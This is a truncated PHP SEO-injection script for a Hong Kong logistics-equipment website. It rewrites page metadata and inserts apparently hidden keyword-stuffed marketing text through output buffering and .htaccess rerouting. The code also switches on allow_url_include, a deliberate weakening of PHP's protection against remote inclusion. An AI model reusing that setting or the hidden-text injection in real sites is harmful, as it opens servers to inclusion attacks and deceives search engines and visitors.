<?php 
/***************SEO信息处理开始*************************
 * 文件名：yf.seo.api.php @fancanjie
 * 文件功能：
 * 	通过修改缓冲区方式修改页面的SEO相关信息；
 * 	创建SEO页面时候，可以在原页面修正一些标签，防止seo-iframe加载失败；
 * 使用方式：
 * 	对于所有的面向对象方式开发的web站点系统，只需要将此文件上传到相应的站点根目录，然后修改网站根目录下的index.php文件，在第二行(或文件最后一行)加上如下引用即可：
 * 		include_once 'yf.seo.api.php';
 * 	若不起作用，尝试在index.php结尾添加：ob_end_flush();
 * 运行环境：
 * 	需要PHP支持sqlite3即可，建议 php.version ≥ 5.3.0
 * 启用静态重写模式：
 * 	若客户网站为纯静态[htm/html]，需要使用此文件进行SEO优化，则需要在网站根目录【.htaccess】文件添加如下代码
##############################################################
<IfModule mod_rewrite.c>
	RewriteEngine On
	RewriteBase /
	Options All -Indexes
	DirectoryIndex index.htm index.html index.php
	RewriteCond %{REQUEST_FILENAME} \.(html|htm)$
	RewriteRule ^(.*)$ yf.seo.api.php?/$1 [PT,L]
</IfModule>
##############################################################

##############################################################
##############################################################
# * 可以根据实际情况，向站点【.htaccess】加入内容压缩与内容缓存
##############################################################
# 内容压缩
AddOutputFilterByType DEFLATE text/plain
AddOutputFilterByType DEFLATE text/html
AddOutputFilterByType DEFLATE text/xml
AddOutputFilterByType DEFLATE text/css
AddOutputFilterByType DEFLATE application/xml
AddOutputFilterByType DEFLATE application/xhtml+xml
AddOutputFilterByType DEFLATE application/rss+xml
AddOutputFilterByType DEFLATE application/javascript
AddOutputFilterByType DEFLATE application/x-javascript
# 内容缓存
<IfModule mod_expires.c>
ExpiresActive On
ExpiresDefault "access plus 1 months"
ExpiresByType text/html "access plus 1 months"
ExpiresByType image/gif "access plus 1 months"
ExpiresByType image/jpeg "access plus 2 months"
ExpiresByType application/x-shockwave-flash "access plus 2 months"
ExpiresByType application/x-javascript "access plus 2 months"
</IfModule>
##############################################################
# php与html文件混写的站点建议通过[php.ini]添加引用：
##############################################################
auto_prepend_file="/home/megeve/www/www/yf.seo.api.php"
##############################################################

 * *********************************************************/
defined('FCPATH') or define('FCPATH', dirname(__FILE__));
define('API_MD5', md5_file(__FILE__));
ini_set('allow_url_fopen','On');
ini_set('allow_url_include','On');

if (!function_exists('array_column')) {
    function array_column($array, $columnKey, $indexKey = null)
    {
        $result = array();
        foreach ($array as $subArray) {
            if (is_null($indexKey) && array_key_exists($columnKey, $subArray)) {
                $result[] = is_object($subArray)?$subArray->$columnKey: $subArray[$columnKey];
            } elseif (array_key_exists($indexKey, $subArray)) {
                if (is_null($columnKey)) {
                    $index = is_object($subArray)?$subArray->$indexKey: $subArray[$indexKey];
                    $result[$index] = $subArray;
                } elseif (array_key_exists($columnKey, $subArray)) {
                    $index = is_object($subArray)?$subArray->$indexKey: $subArray[$indexKey];
                    $result[$index] = is_object($subArray)?$subArray->$columnKey: $subArray[$columnKey];
                }
            }
        }
        return $result;
    }
}

if( !function_exists('mb_strlen') ){
	function mb_strlen($str=''){
		return strlen($str);
	}
}

register_shutdown_function(function(){
	setlocale(LC_ALL, "zh_CN.UTF-8");
	error_reporting(E_ALL ^ E_NOTICE);
	date_default_timezone_set("Asia/Shanghai");
	ini_set('date.timezone','Asia/Shanghai');
	ini_set('display_errors',0);
	ini_set('error_log',($error_log=__DIR__.DIRECTORY_SEPARATOR.'php.fc.log'));
	ini_set('log_errors',1);
	ini_set('ignore_repeated_errors',1);
	if( file_exists($error_log) && filesize($error_log)>5*1024*1024 ){unlink($error_log);}
	$user_defined_err = error_get_last();
	if($user_defined_err['type'] > 0){
		$msg = sprintf('%s %s %s',$user_defined_err['message'],$user_defined_err['file'],$user_defined_err['line']);
		error_log($msg,0);
	}
});

# 设置多久刷新一次文章
RandArticles::$expire_time = 86400*7;
$seo_settings = <<<EOF
{"id":"136","work_id":"1732","url":"https:\/\/lwkpy.com.hk\/yf.seo.api.php","protoct":"https","host":"lwkpy.com.hk","domain":"lwkpy.com.hk","seo_filters":[{"index":0,"request_uri":"\/|","redirect":"","canonical":"","title":"\u674e\u7dad\u8a18 | \u5c08\u696d\u642c\u904b\u8a2d\u5099\u5c08\u5bb6 | \u5c08\u71df\u7269\u6d41\u7c60\u8eca | \u74b0\u4fdd\u56de\u6536\u7c60","keywords":"","description":"\u674e\u7dad\u8a18\u64c1\u6709\u4e09\u5341\u591a\u5e74\u7d93\u9a57\u8001\u5b57\u865f\uff0c\u5c08\u71df\u5404\u985e\u7269\u6d41\u8a2d\u5099\u642c\u904b\u8a2d\u5099\u3001\u5de5\u696d\u8173\u8f2a\u53ca\u81a0\u8f46\uff0c\u8a02\u9020\u4e0d\u92b9\u92fc\u71d2\u710a\u53ca\u7dad\u4fee\u5de5\u7a0b\uff0c\u66f4\u53ef\u4ee3\u5ba2\u6236\u8a2d\u8a08\u5c08\u7528\u624b\u63a8\u8eca\u53ca\u74b0\u4fdd\u56de\u6536\u7c60","hideMark":"","hideBody":"","hideArticlesMark":"","rand_articles":"","rand_article_urls":"","uriIsHome":0,"hideArticlesCacheTime":"","rand_articlesNum":"3","rand_articlesCacheTime":"604800"},{"index":1,"request_uri":"\/logistics-tools\/\u624b\u63a8\u8eca\/prestar\/|\/logistics-tools\/\u624b\u63a8\u8eca\/prestar","redirect":"","canonical":"","title":"\u674e\u7dad\u8a18 | \u8fa6\u516c\u5ba4\u624b\u63a8\u8eca\u4ed4 \u65e5\u672cPrestar\u54c1\u724c \u6027\u80fd\u5353\u8d8a\u512a\u8cea","keywords":"","description":"\u60f3\u5c0b\u627e\u597d\u7528\u8f15\u4fbf\u7684\u8fa6\u516c\u5ba4\u624b\u63a8\u8eca\u4ed4\uff1f\u65e5\u672cPrestar\u54c1\u724c\u624b\u63a8\u8eca\u8f15\u5de7\u8010\u7528\uff0c\u4f7f\u7528\u9ad8\u54c1\u8cea\u7269\u6599\u88fd\u6210\uff0c\u8a2d\u8a08\u7c21\u7d04\uff0c\u529f\u80fd\u5353\u8d8a\uff0c\u66f4\u6709\u4e0d\u540c\u5c3a\u5bf8\u53ca\u9020\u578b\u53ef\u9078\uff0c\u8fa6\u516c\u5ba4\u642c\u904b\u5f9e\u6b64\u66f4\u7c21\u4fbf\uff01","hideMark":"<div class=\"row mt-0 text-center\">","hideBody":"<h1>\u674e\u7dad\u8a18 | \u8fa6\u516c\u5ba4\u624b\u63a8\u8eca\u4ed4 \u65e5\u672cPrestar\u54c1\u724c \u6027\u80fd\u5353\u8d8a\u512a\u8cea<\/h1>\n<p>\u60f3\u5c0b\u627e\u597d\u7528\u8f15\u4fbf\u7684\u8fa6\u516c\u5ba4\u624b\u63a8\u8eca\u4ed4\uff1f\u65e5\u672cPrestar\u54c1\u724c\u624b\u63a8\u8eca\u8f15\u5de7\u8010\u7528\uff0c\u4f7f\u7528\u9ad8\u54c1\u8cea\u7269\u6599\u88fd\u6210\uff0c\u8a2d\u8a08\u7c21\u7d04\uff0c\u529f\u80fd\u5353\u8d8a\uff0c\u66f4\u6709\u4e0d\u540c\u5c3a\u5bf8\u53ca\u9020\u578b\u53ef\u9078\uff0c\u8fa6\u516c\u5ba4\u642c\u904b\u5f9e\u6b64\u66f4\u7c21\u4fbf\uff01<\/p>\n<h2>\u674e\u7dad\u8a18\u51fa\u552e\u6b63\u7248\u65e5\u672cPrestar\u54c1\u724c\u8fa6\u516c\u5ba4\u624b\u63a8\u8eca\u4ed4\uff0c\u5353\u8d8a\u54c1\u8cea\u503c\u5f97\u4fe1\u8cf4<\/h2>\n<p>\u624b\u63a8\u8eca\u5728\u751f\u6d3b\u4e2d\u7d93\u5e38\u770b\u5230\uff0c\u5982\u904b\u9001\u5783\u573e\u7684\u6e05\u6f54\u5de5\u4eba\uff0c\u642c\u904b\u8ca8\u7269\u7684\u901f\u905e\u54e1\uff0c\u6d41\u52d5\u5c0f\u8ca9\uff0c\u6216\u8005\u662f\u56de\u6536\u7d19\u76ae\u7684\u9577\u8005\u7b49\u7b49\uff0c\u5728\u8857\u9053\u4e2d\uff0c\u5beb\u5b57\u6a13\u6216\u8005\u793e\u5340\u88e1\uff0c\u6211\u5011\u6642\u4e0d\u6642\u80fd\u770b\u5230\u624b\u63a8\u8eca\u4ed4\u7684\u884c\u4eba\uff0c\u8fa6\u516c\u5ba4\u624b\u63a8\u8eca\u4ed4\u4e5f\u9010\u6f38\u53d7\u6b61\u8fce\uff0c\u7562\u7adf\u8fa6\u516c\u5ba4\u8a2d\u5099\u6216\u8005\u8fa6\u516c\u5ba4\u8ca8\u7269\u9700\u8981\u642c\u904b\u6642\uff0c\u624b\u63a8\u8eca\u4ed4\u5c31\u767c\u63ee\u4e86\u5b83\u7684\u512a\u52e2\uff0c\u63a8\u8457\u624b\u63a8\u8eca\u5728\u5beb\u5b57\u6a13\u88e1\uff0c\u8fa6\u516c\u5ba4\u88e1\u7a7f\u68ad\u3002<\/p>\n<h3>\u624b\u63a8\u8eca\u4ed4\u7684\u6f14\u8b8a\u5206\u985e<\/h3>\n<p>\u624b\u63a8\u8eca\u70ba\u4e86\u88dd\u5378\u8ca8\u7269\u65b9\u4fbf\uff0c\u6709\u7368\u8f2a\u8eca\uff0c\u5169\u8f2a\uff0c\u4e09\u8f2a\u548c\u56db\u8f2a\u7684\u5340\u5206\uff0c\u50cf\u7f8a\u8178\u5c0f\u5f91\u5f62\u5f0f\u7368\u8f2a\u8eca\u5c31\u4e0d\u932f\uff0c\u642c\u904b\u6210\u4ef6\u8ca8\u7269\u9078\u5169\u8f2a\uff0c\u4e09\u8f2a\u548c\u56db\u8f2a\u5c31\u5f88\u65b9\u4fbf\u3002\u96a8\u8457\u624b\u63a8\u8eca\u4ed4\u7684\u6539\u826f\uff0c\u5b83\u7684\u8eca\u9ad4\u7d50\u69cb\u4e5f\u767c\u751f\u4e86\u8b8a\u5316\uff0c\u6309\u7167\u5b83\u7684\u4f7f\u7528\u74b0\u5883\u6709\u591a\u7a2e\u6750\u8cea\uff0c\u5982\u4e0d\u92b9\u92fc\u3001\u5851\u81a0\uff0c\u92c1\u5236\u7b49\uff0c\u5728\u8fa6\u516c\u5ba4\u624b\u63a8\u8eca\u4ed4\u901a\u5e38\u662f\u92c1\u5236\uff0c\u5851\u81a0\u7b49\u6750\u8cea\uff0c\u7562\u7adf\u6750\u8cea\u8f15\u5f88\u65b9\u4fbf\u651c\u5e36\u3002\u5de5\u696d\uff0c\u5009\u5132\u7528\u92fc\u5236\u7684\uff0c\u5316\u5de5\u91ab\u7642\u7b49\u884c\u696d\uff0c\u4e0d\u92b9\u92fc\u6750\u8cea\u7684\u624b\u63a8\u8eca\u53d7\u6b61\u8fce\u3002\u624b\u63a8\u8eca\u4e5f\u5206\u6709\u55ae\u5c64\uff0c\u96d9\u5c64\uff0c\u7d93\u71df\uff0c\u9632\u975c\u96fb\u7b49\u985e\u578b\uff0c\u9069\u7528\u65bc\u4e0d\u540c\u7684\u5834\u5408\u74b0\u5883\uff0c\u4e26\u56e0\u6b64\u767c\u63ee\u8457\u91cd\u8981\u4f5c\u7528\u3002<\/p>\n<h3>\u5408\u9069\u7684\u8fa6\u516c\u5ba4\u624b\u63a8\u8eca\u4ed4\u9078\u674e\u7dad\u8a18<\/h3>\n<p>\u624b\u63a8\u8eca\u4e0d\u540c\u7528\u9014\u6709\u4e0d\u540c\u7684\u8eca\u9ad4\u7d50\u69cb\uff0c\u5728\u4e0d\u540c\u7684\u5834\u5408\u4e0b\u4e5f\u6703\u56e0\u70ba\u4f7f\u7528\u74b0\u5883\u800c\u642d\u914d\u5408\u9069\u7684\u6750\u8cea\u624b\u63a8\u8eca\uff0c\u624b\u63a8\u8eca\u7a2e\u985e\u7b49\u3002\u9700\u8981\u8cfc\u8cb7\u624b\u63a8\u8eca\u7684\u8fa6\u516c\u5ba4\uff0c\u8003\u616e\u5728\u8fa6\u516c\u5ba4\u4e2d\u4e26\u4e0d\u9700\u8981\u9019\u9ebc\u5927\u7684\u624b\u63a8\u8eca\uff0c\u8003\u616e\u7684\u662f\u8f15\u4fbf\u5be6\u7528\u6027\u3002\u9999\u6e2f\u674e\u7dad\u8a18\u51fa\u552e\u7684\u65e5\u672c\u54c1\u724cPrestar\u54c1\u724c\u624b\u63a8\u8eca\u5c31\u5f88\u597d\u6eff\u8db3\u4e86\u7528\u6236\u9700\u6c42\uff0c\u5b83\u8f15\u5de7\u8010\u7528\uff0c\u4f7f\u7528\u9ad8\u54c1\u8cea\u7269\u6599\u88fd\u6210\uff0c\u8a2d\u8a08\u7c21\u7d04\uff0c\u529f\u80fd\u5f37\u5927\uff0c\u4f7f\u7528\u65b9\u4fbf\uff0c\u9020\u578b\u5c3a\u5bf8\u4e0d\u540c\u53ef\u4efb\u5176\u6311\u9078\uff0c\u9069\u5408\u8fa6\u516c\u5ba4\u642c\u904b\u8ca8\u7269\u4f7f\u7528\u3002<\/p>\n<p>\u4e00\u6b3e\u7d93\u4e45\u8010\u7528\u7684\u8fa6\u516c\u5ba4\u624b\u63a8\u8eca\u4ed4\uff0c\u65b9\u4fbf\u4e86\u65e5\u5e38\u642c\u904b\u8fa6\u516c\u5ba4\u8a2d\u5099\uff0c\u8fa6\u516c\u5ba4\u7269\u6599\u7b49\uff0c\u9ad8\u54c1\u8cea\u7684\u624b\u63a8\u8eca\u7528\u6599\u597d\uff0c\u54c1\u8cea\u9ad8\uff0c\u8a2d\u8a08\u7cbe\u826f\uff0c\u6b3e\u5f0f\u4e5f\u591a\uff0c\u6eff\u8db3\u4e86\u8fa6\u516c\u5ba4\u7684\u6b63\u5e38\u9700\u6c42\u3002\u4f01\u696d\u516c\u53f8\u53ef\u8003\u616e\u8fa6\u516c\u5ba4\u662f\u5426\u9700\u6c42\uff0c\u6dfb\u7f6e\u4e00\u6b3e\u597d\u7528\u7684\u624b\u63a8\u8eca\uff0c\u63d0\u5347\u8fa6\u516c\u8ca8\u7269\u904b\u8f38\u6548\u7387\u3002<\/p>","hideArticlesMark":"","rand_articles":"","rand_article_urls":"","uriIsHome":0,"hideArticlesCacheTime":"","rand_articlesNum":"3","rand_articlesCacheTime":"604800"},{"index":2,"request_uri":"\/recycle-logistics-cage\/|\/recycle-logistics-cage","redirect":"","canonical":"","title":"\u674e\u7dad\u8a18 | \u74b0\u4fdd\u56de\u6536\u7c60\u8eca \u7d93\u6fdf\u8010\u7528 \u7d44\u88dd\u5f0f\u8a2d\u8a08\u65b9\u4fbf\u7dad\u4fee\u66f4\u74b0\u4fdd","keywords":"","description":"\u674e\u7dad\u8a18\u74b0\u4fdd\u56de\u6536\u7c60\u8eca\u63a1\u7528\u74b0\u4fdd\u7269\u6599\u914d\u5408\u8077\u5b89\u5065\u8003\u91cf\u88fd\u6210\uff0c\u7279\u8a2d\u7d44\u88dd\u5f0f\u8a2d\u8a08\uff0c\u6613\u62c6\u6613\u88dd\uff0c\u53ea\u9700\u66f4\u63db\u640d\u58de\u90e8\u5206\u7684\u7d44\u4ef6\u4fbf\u53ef\uff0c\u66f4\u7b26\u5408\u7d93\u6fdf\u539f\u5247\uff0c\u66f4\u74b0\u4fdd\u8010\u7528\uff0c\u6b61\u8fce\u4ee5WhatsApp\u806f\u7d61\u67e5\u8a62\u3002","hideMark":"<div class=\"row justify-content-center\">","hideBody":"<h1>\u674e\u7dad\u8a18 | \u74b0\u4fdd\u56de\u6536\u7c60\u8eca \u7d93\u6fdf\u8010\u7528 \u7d44\u88dd\u5f0f\u8a2d\u8a08\u65b9\u4fbf\u7dad\u4fee\u66f4\u74b0\u4fdd<\/h1>\n<p>\u674e\u7dad\u8a18\u74b0\u4fdd\u56de\u6536\u7c60\u8eca\u63a1\u7528\u74b0\u4fdd\u7269\u6599\u914d\u5408\u8077\u5b89\u5065\u8003\u91cf\u88fd\u6210\uff0c\u7279\u8a2d\u7d44\u88dd\u5f0f\u8a2d\u8a08\uff0c\u6613\u62c6\u6613\u88dd\uff0c\u53ea\u9700\u66f4\u63db\u640d\u58de\u90e8\u5206\u7684\u7d44\u4ef6\u4fbf\u53ef\uff0c\u66f4\u7b26\u5408\u7d93\u6fdf\u539f\u5247\uff0c\u66f4\u74b0\u4fdd\u8010\u7528\uff0c\u6b61\u8fce\u4ee5WhatsApp\u806f\u7d61\u67e5\u8a62\u3002<\/p>\n<h2>\u7d44\u5408\u7c21\u55ae\u7dad\u4fee\u65b9\u4fbf\u7684\u74b0\u4fdd\u56de\u6536\u7c60\u8eca\u9069\u5408\u4f01\u696d\u7269\u6d41\u914d\u9001\u5468\u8f49<\/h2>\n<p>\u74b0\u4fdd\u5728\u7576\u4e0b\u4f9d\u820a\u662f\u71b1\u9580\u7684\u8a71\u984c\uff0c\u4e5f\u662f\u9577\u671f\u53ef\u6301\u7e8c\u767c\u5c55\u6230\u7565\u7684\u91cd\u9ede\uff0c\u74b0\u4fdd\u884c\u696d\u9ad4\u73fe\u5728\u751f\u6d3b\u7684\u65b9\u65b9\u9762\u9762\uff0c\u570b\u5bb6\u4e5f\u5728\u5927\u529b\u63a8\u52d5\u74b0\u4fdd\u9805\u76ee\u767c\u5c55\uff0c\u6240\u4ee5\u4f01\u696d\u4e5f\u6539\u8d85\u9769\u65b0\u3002\u4f8b\u5982\u9999\u6e2f\u674e\u7dad\u8a18\u516c\u53f8\uff0c\u751f\u7522\u7684\u74b0\u4fdd\u56de\u6536\u7c60\u8eca\u5c31\u662f\u63a1\u7528\u7684\u74b0\u4fdd\u7269\u6599\u914d\u5408\u4e0a\u8077\u5b89\u5065\u8003\u91cf\u88fd\u4f5c\u800c\u6210\uff0c\u9019\u985e\u56de\u6536\u7c60\u8eca\u7684\u7279\u9ede\u512a\u52e2\u4e5f\u6709\u4e0d\u5c11\u3002<\/p>\n<h3>\u74b0\u4fdd\u56de\u6536\u7c60\u8eca\u7684\u7279\u9ede<\/h3>\n<p>\u674e\u7dad\u8a18\u7684\u56de\u6536\u7c60\u8eca\u662f\u81ea\u5bb6\u7814\u767c\u7d44\u88dd\u5f0f\uff0c\u6309\u9700\u8981\u66f4\u63db\u640d\u6bc0\u7684\u5143\u4ef6\u5373\u53ef\uff0c\u4e0d\u9700\u5168\u90e8\u66f4\u63db\uff0c\u74b0\u4fdd\uff0c\u4e14\u7d44\u5408\u7c21\u55ae\uff0c\u80fd\u5f9e\u6e90\u982d\u4e0a\u6e1b\u5c11\u4e86\u5ee2\u6599\u7684\u7522\u751f\u3002\u5b83\u7684\u8868\u9762\u7f8e\u89c0\uff0c\u4f7f\u7528\u58fd\u547d\u9577\uff0c\u6709\u4e0d\u932f\u7684\u7a7a\u9593\u5229\u7528\u7387\uff0c\u65b9\u4fbf\u4f01\u696d\u7528\u65bc\u5b58\u653e\u8ca8\u7269\uff0c\u4e14\u898f\u683c\u7d71\u4e00\u5bb9\u91cf\u56fa\u5b9a\uff0c\u65b9\u4fbf\u6e05\u9ede\u5eab\u5b58\u3002\u9019\u985e\u56de\u6536\u7c60\u8eca\u8868\u9762\u7d93\u904e\u4e86\u74b0\u4fdd\u8655\u7406\uff0c\u5b58\u653e\u56de\u6536\u4e0d\u6c61\u67d3\u74b0\u5883\uff0c\u5f37\u5ea6\u9ad8\uff0c\u6709\u4e0d\u932f\u7684\u88dd\u8f09\u80fd\u529b\uff0c\u52a0\u4e0a\u5e95\u4e0b\u914d\u7f6e\u6709\u8f2a\u5b50\uff0c\u5728\u5eab\u623f\u5167\u4f7f\u7528\u5f88\u65b9\u4fbf\u3002\u674e\u7dad\u8a18\u7684\u7684\u74b0\u4fdd\u56de\u6536\u7c60\u8eca\u6709\u7d44\u88dd\u5f0f\uff0c\u56fa\u5b9a\u5f0f\uff0c\u5169\u8005\u4efb\u4f60\u6311\u9078\u3002<\/p>\n<h3>\u74b0\u4fdd\u56de\u6536\u7c60\u8eca\u7684\u5206\u985e<\/h3>\n<p>\u5b83\u5206\u6709\u7db2\u8def\u72c0\u7269\u6d41\u3001\u5169\u9762\u578b\u3001\u9435\u677f\u578b\uff0c\u5176\u4e2d\u5169\u9762\u578b\u9084\u6709\u5169\u9762\u7db2\u7247\uff0c\u4e09\u9762\u7db2\u7247\u548c\u56db\u9762\u7db2\u7247\u3002\u4e0d\u7ba1\u662f\u90a3\u7a2e\u985e\u578b\u662f\u54ea\u4e00\u985e\u578b\u7684\u7c60\u8eca\uff0c\u5b83\u90fd\u5177\u6709\u4e0d\u932f\u7684\u627f\u8f09\u91cf\uff0c\u4e5f\u662f\u9069\u7528\u65bc\u5f88\u591a\u7684\u884c\u696d\uff0c\u50cf\u9435\u677f\u578b\u7c60\u8eca\uff0c\u5b83\u7684\u627f\u8f09\u91cf\u5927\uff0c\u6298\u758a\u5f8c\u9084\u80fd\u8d77\u5230\u7bc0\u7701\u7a7a\u9593\u7684\u4f5c\u7528\u3002<\/p>\n<p>\u88ab\u5ee3\u6cdb\u7528\u65bc\u7269\u6d41\u884c\u696d\u7684\u7c60\u8eca\uff0c\u4e3b\u8981\u7528\u65bc\u65b9\u4fbf\u7269\u54c1\u7684\u642c\u904b\uff0c\u5b83\u7684\u6a5f\u52d5\u6027\u80fd\u9ad8\uff0c\u9084\u80fd\u6298\u758a\u4f7f\u7528\uff0c\u7bc0\u7d04\u4e86\u7a7a\u9593\uff0c\u800c\u74b0\u4fdd\u56de\u6536\u7c60\u8eca\u7531\u65bc\u63a1\u7528\u7684\u662f\u74b0\u4fdd\u6750\u6599\uff0c\u7d93\u904e\u8655\u7406\u4e4b\u5f8c\uff0c\u53cd\u800c\u80fd\u6e1b\u5c11\u4e86\u6c61\u67d3\uff0c\u4f4e\u78b3\u74b0\u4fdd\u3002\u74b0\u4fdd\u56de\u6536\u7c60\u8eca\u5728\u7269\u6d41\u914d\u9001\uff0c\u5de5\u5ee0\u5009\u5eab\u7b49\u5730\u65b9\u9032\u884c\u7269\u6d41\u5468\u8f49\u4f7f\u7528\u5f88\u65b9\u4fbf\uff0c\u7279\u5225\u662f\u674e\u7dad\u8a18\u7684\u74b0\u4fdd\u56de\u6536\u7c60\u8eca\uff0c\u5b83\u8a72\u5229\u65bc\u7d44\u5408\u7dad\u4fee\uff0c\u7279\u9ede\u660e\u986f\uff0c\u518d\u7d50\u5408\u5b83\u7684\u74b0\u4fdd\u7279\u6027\uff0c\u5916\u89c0\u7f8e\u89c0\uff0c\u4f7f\u7528\u58fd\u547d\u9577\uff0c\u4e14\u904b\u9001\u8f15\u4fbf\u64cd\u4f5c\u9748\u6d3b\u7c21\u55ae\uff0c\u5728\u642c\u904b\u904e\u7a0b\u4e2d\u9084\u662f\u5f88\u5b89\u5168\u53ef\u9760\u7684\u3002<\/p>","hideArticlesMark":"","rand_articles":"","rand_article_urls":"","uriIsHome":0,"hideArticlesCacheTime":"","rand_articlesNum":"3","rand_articlesCacheTime":"604800"},{"index":3,"request_uri":"\/electric-handling-tools\/|\/electric-handling-tools","redirect":"","canonical":"","title":"\u674e\u7dad\u8a18 | \u96fb\u52d5\u642c\u904b\u8a2d\u5099\u7cfb\u5217 | \u96fb\u52d5\u624b\u63a8\u8eca \u6173\u6c34\u6173\u529b\u4fdd\u5b89\u5168","keywords":"","description":"\u674e\u7dad\u8a18\u63d0\u4f9b\u96fb\u52d5\u642c\u904b\u8a2d\u5099\uff0c\u96fb\u52d5\u624b\u63a8\u8eca\u4f86\u81ea\u82f1\u570b\u53ca\u610f\u5927\u5229\uff0c\u667a\u80fd\u8a2d\u8a08\u6709\u6548\u63d0\u5347\u642c\u904b\u6548\u80fd\u53ca\u5b89\u5168\u6027\uff0c\u9069\u5408\u8fa6\u516c\u5ba4\u3001\u5b78\u6821\u3001\u8ca8\u5009\u3001\u91ab\u9662\u3001\u96f6\u552e\u9580\u5e02\u7b49\u4e0d\u540c\u5834\u5408\u4f7f\u7528\uff0c\u6b61\u8fce\u9810\u7d04\u8a66\u8eca\u3002","hideMark":"<div class=\"container products-list\">","hideBody":"<h1>\u674e\u7dad\u8a18 | \u96fb\u52d5\u642c\u904b\u8a2d\u5099\u7cfb\u5217 | \u96fb\u52d5\u624b\u63a8\u8eca \u6173\u6c34\u6173\u529b\u4fdd\u5b89\u5168<\/h1>\n<p>\u674e\u7dad\u8a18\u63d0\u4f9b\u96fb\u52d5\u642c\u904b\u8a2d\u5099\uff0c\u96fb\u52d5\u624b\u63a8\u8eca\u4f86\u81ea\u82f1\u570b\u53ca\u610f\u5927\u5229\uff0c\u667a\u80fd\u8a2d\u8a08\u6709\u6548\u63d0\u5347\u642c\u904b\u6548\u80fd\u53ca\u5b89\u5168\u6027\uff0c\u9069\u5408\u8fa6\u516c\u5ba4\u3001\u5b78\u6821\u3001\u8ca8\u5009\u3001\u91ab\u9662\u3001\u96f6\u552e\u9580\u5e02\u7b49\u4e0d\u540c\u5834\u5408\u4f7f\u7528\uff0c\u6b61\u8fce\u9810\u7d04\u8a66\u8eca\u3002<\/p>\n<h2>\u674e\u7dad\u8a18\u96fb\u52d5\u624b\u63a8\u8eca\u642c\u904b\u8a2d\u5099\uff0c\u667a\u6167\u8a2d\u8a08\u5b89\u5168\u65b9\u4fbf<\/h2>\n<p>\u96fb\u5b50\u8a2d\u5099\u7684\u66f4\u65b0\u63db\u4ee3\uff0c\u8b93\u4eba\u5011\u7684\u751f\u6d3b\u8b8a\u5f97\u65b9\u4fbf\u4e0d\u5c11\uff0c\u6bd4\u5982\u624b\u63a8\u8eca\uff0c\u4ee5\u5f80\u4e00\u4e9b\u8ca8\u5009\uff0c\u91ab\u9662\uff0c\u6216\u8005\u96f6\u552e\u9580\u5e97\uff0c\u9700\u8981\u88dd\u8f09\u5f88\u591a\u7269\u54c1\uff0c\u7d93\u5e38\u8981\u8ca8\u7269\u914d\u9001\u5468\u8f49\uff0c\u90fd\u9700\u8981\u7528\u5230\u624b\u63a8\u8eca\uff0c\u4f46\u4eba\u529b\u63a8\u8eca\u59cb\u7d42\u6bd4\u8f03\u8cbb\u9ad4\u529b\uff0c\u4eba\u5de5\u6210\u672c\u9ad8\u3002\u800c\u6709\u4e86\u96fb\u52d5\u624b\u63a8\u8eca\u4e4b\u5f8c\uff0c\u9019\u7a2e\u8cbb\u529b\u7684\u4e8b\u60c5\u505a\u8d77\u4f86\u5c31\u7c21\u55ae\u591a\u4e86\u3002\u96fb\u52d5\u642c\u904b\u8a2d\u5099\u7684\u51fa\u73fe\u6975\u5927\u6539\u5584\u4e86\u5de5\u4f5c\u74b0\u5883\uff0c\u4e5f\u8b93\u4e0d\u5c11\u5de5\u4f5c\u4eba\u54e1\u63d0\u5347\u4e86\u5de5\u4f5c\u6548\u7387\u3002<\/p>\n<h3>\u96fb\u52d5\u642c\u904b\u8a2d\u5099\u5be6\u73fe\u4e00\u6a5f\u591a\u7528<\/h3>\n<p>\u5546\u5834\u3001\u5b78\u6821\u3001\u8fa6\u516c\u5ba4\u3001\u8ca8\u5009\u3001\u91ab\u9662\uff0c\u96f6\u552e\u5e97\u7b49\u5730\u65b9\uff0c\u7d93\u5e38\u9700\u8981\u642c\u904b\u4e00\u4e9b\u8ca8\u7269\uff0c\u5546\u54c1\u7b49\uff0c\u4f7f\u7528\u96fb\u52d5\u642c\u904b\u8a2d\u5099\u7bc0\u7701\u4eba\u529b\u7684\u652f\u51fa\uff0c\u89e3\u653e\u4e86\u96d9\u65b9\uff0c\u5c0d\u6bd4\u50b3\u7d71\u624b\u63a8\u7684\u5f62\u5f0f\uff0c\u96fb\u52d5\u624b\u63a8\u8eca\u81ea\u7136\u66f4\u53d7\u6b61\u8fce\u8207\u8a8d\u53ef\u3002\u96fb\u52d5\u642c\u904b\u8a2d\u5099\u512a\u52e2\u5c31\u9ad4\u73fe\u5728\uff0c\u5b83\u5f37\u529b\u6709\u52c1\uff0c\u7562\u7adf\u662f\u4f7f\u7528\u4e86\u96fb\u80fd\uff0c\u4e14\u6a5f\u9ad4\u8a2d\u5099\u7d93\u4e45\u8010\u7528\uff0c\u64cd\u4f5c\u7c21\u55ae\uff0c\u65b9\u4fbf\u5feb\u6377\uff0c\u901a\u5e38\u9760\u4eba\u529b\u642c\u904b\u534a\u5c0f\u6642\u7684\u8ca8\u7269\uff0c\u96fb\u52d5\u624b\u63a8\u8eca\u6c92\u51c6\u5341\u5206\u9418\u5c31\u642c\u5b8c\u4e86\uff0c\u5728\u4e00\u4e9b\u72f9\u5c0f\u7684\u5730\u65b9\u4f5c\u696d\u4e5f\u4e0d\u7528\u64d4\u5fc3\uff0c\u5b83\u5177\u5099\u6709\u8f49\u5f4e\u529f\u80fd\uff0c\u64cd\u4f5c\u9748\u6d3b\u3002\u96fb\u52d5\u642c\u904b\u8a2d\u5099\u5728\u96fb\u6e90\u4e0a\u4f7f\u7528\u4e86\u74b0\u4fdd\u96fb\u6c60\u96fb\u6e90\u4f9b\u96fb\uff0c\u96f6\u6392\u653e\u7121\u6c61\u67d3\uff0c\u66f4\u52a0\u7b26\u5408\u7576\u4e0b\u74b0\u4fdd\u7da0\u8272\u7684\u4e3b\u984c\u3002<\/p>\n<h3>\u674e\u7dad\u8a18\u96fb\u52d5\u624b\u63a8\u8eca\u54c1\u8cea\u88fd\u4f5c\u7528\u5fc3\u670d\u52d9<\/h3>\n<p>\u96fb\u52d5\u642c\u904b\u8a2d\u5099\u4f7f\u7528\u7bc4\u570d\u5ee3\uff0c\u56e0\u6b64\u5099\u53d7\u597d\u8a55\u8a8d\u53ef\uff0c\u7528\u6236\u8981\u8cfc\u8cb7\u54c1\u8cea\u6709\u4fdd\u8b49\u7684\u54c1\u724c\u96fb\u52d5\u624b\u63a8\u8eca\u6703\u66f4\u5177\u6709\u5b89\u5168\u6027\u3002\u674e\u7dad\u8a18\u76ee\u524d\u63d0\u4f9b\u4f86\u81ea\u82f1\u570b\u548c\u7fa9\u5927\u5229\u7684\u96fb\u52d5\u642c